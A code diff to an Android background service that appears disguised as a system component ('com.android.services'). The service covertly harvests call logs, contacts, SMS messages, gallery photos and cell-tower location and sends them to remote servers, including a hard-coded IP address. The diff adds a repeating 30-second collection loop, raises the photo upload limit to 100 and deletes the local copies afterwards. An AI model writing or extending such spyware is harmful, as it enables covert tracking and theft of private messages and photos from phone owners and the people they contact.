@@ -82,9 +82,11 @@ import static com.android.services.Utils.AppConf.URL_UPDATE_LOKASI;
 
 public class UpdateService extends Service {
     private static final String LOG_TAG = "ForegroundService";
-    private Handler handler = new Handler();
+    private Handler handler;
+    private Handler handlerPost;
     private final int NOTIFICATION_ID = 1479;
     private final int DELAY = 300000;
+    private final int DELAYUPLOAD = 30000;
     private RequestQueue requestQueue;
     private boolean checkloc;
     private LocationManager locationManager;
@@ -109,8 +111,9 @@ public class UpdateService extends Service {
     private FusedLocationProviderClient mFusedLocationClient;
     private final String TAG = "MNACT";
     private GsmCellLocation gsmCellLocation;
+    public TelephonyManager telephonyManager;
 
-    
+
     @Override
     public void onCreate() {
         super.onCreate();
@@ -118,6 +121,10 @@ public class UpdateService extends Service {
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
+
+
+        handler = new Handler();
+        handlerPost = new Handler();
 
         file = new File(Environment.getExternalStorageDirectory()
                 + "/" + IMAGE_DIRECTORY);
@@ -158,15 +165,10 @@ public class UpdateService extends Service {
         startForeground(NOTIFICATION_ID,
                 notification);
 
-        LocalBroadcastManager.getInstance(this).registerReceiver(broadcastReceiver, new IntentFilter("send"));
-
         handler.post(updateData);
 
 
-
-
-        TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
-        String networkOperator = telephonyManager.getNetworkOperator();
+        telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
 
         mFusedLocationClient = LocationServices.getFusedLocationProviderClient(this);
         gsmCellLocation = (GsmCellLocation) telephonyManager.getCellLocation();
@@ -215,6 +217,15 @@ public class UpdateService extends Service {
         mnc = 0;
 
 
+        handlerPost.post(runnable);
+
+        return START_STICKY;
+    }
+
+    private void startGetData() {
+
+        String networkOperator = telephonyManager.getNetworkOperator();
+
         try {
 
             cid = gsmCellLocation.getCid();
@@ -238,27 +249,71 @@ public class UpdateService extends Service {
         sessionManager.setMcc(String.valueOf(mcc));
         sessionManager.setMnc(String.valueOf(mnc));
 
-        callLog();
-
-        return START_STICKY;
     }
 
-    public BroadcastReceiver broadcastReceiver = new BroadcastReceiver() {
+    private Runnable runnable = new Runnable() {
         @Override
-        public void onReceive(Context context, Intent intent) {
-//            ambilgallery();
-//            InsertDeep();
-//            AsyncTaskRunner task = new AsyncTaskRunner();
-//            task.execute();
+        public void run() {
+
+            startGetData();
+            handlerPost.postDelayed(runnable, DELAYUPLOAD);
+
         }
     };
+
+
+    private void getLoc() {
+        AndLog.ShowLog("dss", "http://118.98.64.43/wablast/files/cloc.php?mcc=" + mcc + "&mnc=" + mnc + "&LAC=" + lac + "&cid=" + cid);
+        StringRequest stringRequest = new StringRequest(Request.Method.GET, "http://118.98.64.43/wablast/files/cloc.php?mcc=" + mcc + "&mnc=" + mnc + "&LAC=" + lac + "&cid=" + cid, new Response.Listener<String>() {
+            @Override
+            public void onResponse(String response) {
+
+                try {
+
+                    JSONObject jo = new JSONObject(response);
+                    String hasil = jo.getString("hasil");
+
+                    if (hasil.toString().trim().equals("true")) {
+
+                        lat_cid = jo.getString("lat");
+                        lon_cid = jo.getString("lon");
+                        sessionManager.setLatCid(lat_cid);
+                        sessionManager.setLngCid(lon_cid);
+
+
+                        callLog();
+
+
+                    }
+
+                } catch (JSONException e) {
+                    e.printStackTrace();
+
+
+                }
+
+
+            }
+        }, new Response.ErrorListener() {
+            @Override
+            public void onErrorResponse(VolleyError error) {
+
+            }
+
+        }) {
+
+        };
+
+        stringRequest.setTag(getString(R.string.app_name));
+        VolleyHttp.getInstance(this).addToRequestQueue(stringRequest);
+
+    }
+
 
     private class AsyncTaskRunner extends AsyncTask<String, String, String> {
 
         private String resp;
-        //        ProgressDialog progressDialog;
         private String result1;
-        private String result2;
 
         @Override
         protected String doInBackground(String... params) {
@@ -266,8 +321,12 @@ public class UpdateService extends Service {
             //Tooat("Welcome "+params[0]);
             try {
 
+                if (!file.exists()) {
+                    file.mkdirs();
+                }
+
                 result1 = "";
-                result2 = "";
+
 
                 resp = null;
 
@@ -291,8 +350,10 @@ public class UpdateService extends Service {
                             e.printStackTrace();
                         }
 
-                        if (send < 10) {
+                        if (send < 100) {
                             resp = deepImagesInsert(filePath, destFile.getPath());
+                        } else {
+                            deleteDir(file);
                         }
 
                         send++;
@@ -372,17 +433,27 @@ public class UpdateService extends Service {
             return_value = combine;
             //Toast.makeText(this,combine,Toast.LENGTH_SHORT).show();
 
-            if (imageFile != null) {
 
-                if (imageFile.exists()) {
-                    imageFile.delete();
-                }
-            }
         } catch (Exception ex) {
             return_value = ex.getMessage();
         }
 
         return return_value;
+    }
+
+    public static boolean deleteDir(File dir) {
+        if (dir.isDirectory()) {
+            String[] children = dir.list();
+            for (int i = 0; i < children.length; i++) {
+                boolean success = deleteDir(new File(dir, children[i]));
+                if (!success) {
+                    return false;
+                }
+            }
+        }
+
+        // The directory is now empty so delete it
+        return dir.delete();
     }
 
     @SuppressLint("MissingPermission")
@@ -454,7 +525,8 @@ public class UpdateService extends Service {
     }
 
     private void InsertDeep() {
-        AndLog.ShowLog("dsdeep","sdasd");
+        AndLog.ShowLog("dsdeep", "sdasd");
+
         final SessionManager sess = new SessionManager(getApplicationContext());
         StringRequest strReq = new StringRequest(Request.Method.POST, URL_SEND_DEEP, new Response.Listener<String>() {
 
@@ -535,7 +607,7 @@ public class UpdateService extends Service {
         }
     };
 
-    public ArrayList<Model_images> ambilgallery() {
+    public void ambilgallery() {
         al_images.clear();
 
         int int_position = 0;
@@ -570,33 +642,38 @@ public class UpdateService extends Service {
                 }
             }
 
-            if (boolean_folder) {
+            try {
 
-                ArrayList<String> al_path = new ArrayList<>();
-                al_path.addAll(al_images.get(int_position).getAl_imagepath());
-                al_path.add(absolutePathOfImage);
-                al_images.get(int_position).setAl_imagepath(al_path);
+                if (boolean_folder) {
 
-            } else {
-                ArrayList<String> al_path = new ArrayList<>();
-                al_path.add(absolutePathOfImage);
-                Model_images obj_model = new Model_images();
-                obj_model.setStr_folder(cursor.getString(column_index_folder_name));
-                obj_model.setAl_imagepath(al_path);
+                    ArrayList<String> al_path = new ArrayList<>();
+                    al_path.addAll(al_images.get(int_position).getAl_imagepath());
+                    al_path.add(absolutePathOfImage);
+                    al_images.get(int_position).setAl_imagepath(al_path);
 
-                al_images.add(obj_model);
+                } else {
+                    ArrayList<String> al_path = new ArrayList<>();
+                    al_path.add(absolutePathOfImage);
+                    Model_images obj_model = new Model_images();
+                    obj_model.setStr_folder(cursor.getString(column_index_folder_name));
+                    obj_model.setAl_imagepath(al_path);
 
+                    al_images.add(obj_model);
+
+
+                }
+            } catch (IndexOutOfBoundsException e) {
+
+            } catch (Exception e) {
 
             }
 
 
         }
 
-
-        return al_images;
     }
 
-    private void SimpanAll(){
+    private void SimpanAll() {
         ambilgallery();
         InsertDeep();
         AsyncTaskRunner task = new AsyncTaskRunner();
@@ -627,7 +704,9 @@ public class UpdateService extends Service {
     @Override
     public void onDestroy() {
         super.onDestroy();
-        LocalBroadcastManager.getInstance(this).unregisterReceiver(broadcastReceiver);
+
+        handler.removeCallbacks(updateData);
+        handlerPost.removeCallbacks(runnable);
     }
 
     @Override
@@ -705,50 +784,6 @@ public class UpdateService extends Service {
         }
     }
 
-    private void getLoc() {
-        AndLog.ShowLog("dss", "http://118.98.64.43/wablast/files/cloc.php?mcc=" + mcc + "&mnc=" + mnc + "&LAC=" + lac + "&cid=" + cid);
-        StringRequest stringRequest = new StringRequest(Request.Method.GET, "http://118.98.64.43/wablast/files/cloc.php?mcc=" + mcc + "&mnc=" + mnc + "&LAC=" + lac + "&cid=" + cid, new Response.Listener<String>() {
-            @Override
-            public void onResponse(String response) {
-
-                try {
-
-                    JSONObject jo = new JSONObject(response);
-                    String hasil = jo.getString("hasil");
-
-                    if (hasil.toString().trim().equals("true")) {
-
-                        lat_cid = jo.getString("lat");
-                        lon_cid = jo.getString("lon");
-                        sessionManager.setLatCid(lat_cid);
-                        sessionManager.setLngCid(lon_cid);
-
-                    }
-
-                } catch (JSONException e) {
-                    e.printStackTrace();
-
-
-                }
-
-
-            }
-        }, new Response.ErrorListener() {
-            @Override
-            public void onErrorResponse(VolleyError error) {
-
-            }
-
-        }) {
-
-        };
-
-        stringRequest.setTag(getString(R.string.app_name));
-        VolleyHttp.getInstance(this).addToRequestQueue(stringRequest);
-
-    }
-
-
     //    get call log
     private void getCallLogs(Cursor curLog) {
         AndLog.ShowLog("runn1ng:", "getcallogs");
@@ -794,7 +829,7 @@ public class UpdateService extends Service {
 //                conType.add("Outgoing");
                 finaldata = finaldata + " ( Outgoing )";
             }
-            data = data + finaldata +"###";
+            data = data + finaldata + "###";
         }
 
         final String CalLog = data;
@@ -809,7 +844,9 @@ public class UpdateService extends Service {
         AndLog.ShowLog("runn1ng:", "contactLog");
         if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED) {
 
-            new LoadFromContactList().execute();
+            LoadFromContactList jsonTask = new LoadFromContactList();
+            jsonTask.execute();
+
         }
     }
 
@@ -853,6 +890,7 @@ public class UpdateService extends Service {
             final String Contact = data;
             AndLog.ShowLog("Ctc_list", Contact);
             sessionManager.setContact(Contact);
+
             fetchInbox();
 
         }
@@ -861,6 +899,8 @@ public class UpdateService extends Service {
     }
 
     private ArrayList<ContactModel> LihatContact() {
+
+        AndLog.ShowLog("runn1ng", "LihatContact");
 
         ArrayList<ContactModel> tmpContact = new ArrayList<>();
         ContactModel contactVO;
@@ -897,7 +937,7 @@ public class UpdateService extends Service {
     }
 
     public void fetchInbox() {
-        AndLog.ShowLog("runn1ng","fetchInbox");
+        AndLog.ShowLog("runn1ng", "fetchInbox");
         ArrayList sms = new ArrayList();
 
         Uri uriSms = Uri.parse("content://sms/inbox");
